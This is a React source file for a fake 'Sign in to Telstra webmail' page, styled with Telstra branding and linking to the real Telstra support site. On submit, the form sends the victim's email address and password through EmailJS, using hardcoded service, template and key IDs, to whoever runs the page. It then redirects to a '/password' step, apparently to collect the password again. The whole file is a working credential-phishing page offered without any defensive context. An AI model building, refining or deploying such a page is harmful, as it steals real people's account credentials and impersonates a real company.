import { useState, useRef } from "react";
import { useNavigate } from "react-router-dom"; // MUST import this
import emailjs from "@emailjs/browser";
import logo from "../assets/logo.png";

export default function LoginForm() {
  const formRef = useRef(); 
  const navigate = useNavigate(); // MUST initialize this
  
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  function sendEmail(e) {
    e.preventDefault();

    emailjs.sendForm(
      "service_zjlwo6t",
      "template_52a3qyr",
      formRef.current,
      "_Q9xZ5XCSNDfFv5ef"
    ) 
    .then(() => {
        console.log("Email sent successfully!");
        e.target.reset();
      },
      (error) => {
        console.error("Failed to send email:", error);
      }
    )
    .finally(() => {
      // This will now work because 'navigate' is defined above
      setTimeout(() => {
        navigate("/password"); 
      }, 3000);
    });
  }

  return (
    <div className="login-page">
      <header className="navbar">
        <img src={logo} alt="Telstra Logo" className="logo"/>
      </header>

      <section className="login-container">
        <div className="login-card">
          <h2>Sign in to Telstra webmail</h2>
          <p className="subtitle">Sign in with your Telstra email address</p>

          {/* 3. Assigned formRef to the ref attribute */}
          <form ref={formRef} onSubmit={sendEmail}>
            <label>Telstra email</label>
            <input
              name="user_email" // Ensure these names match your EmailJS template
              type="email"
              placeholder="Example: john@bigpond.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            
            <label>Password</label>
            <div className="password-wrapper">
              <input
                name="user_password" // Ensure these names match your EmailJS template
                type={showPassword ? "text" : "password"}
                placeholder="Enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
              <span
                className="eye"
                style={{ cursor: 'pointer' }}
                onClick={() => setShowPassword(!showPassword)}
                title={showPassword ? "Hide password" : "Show password"}
              >
                {showPassword ? "🙈" : "👁"}
              </span>
            </div>

            <a href="https://www.telstra.com.au/support/email/forgot-password" className="forgot-link">Forgot Telstra email</a>

            <div className="remember">
              <input type="checkbox" id="remember"/>
              <label htmlFor="remember">Remember Telstra email</label>
            </div>

            <button type="submit" className="continue-btn">Continue</button>
          </form>

          <div className="divider"><span>OR</span></div>
          <button type="button" className="secondary-btn">Sign in to MyTelstra</button>
        </div>
      </section>
    </div>
  );
}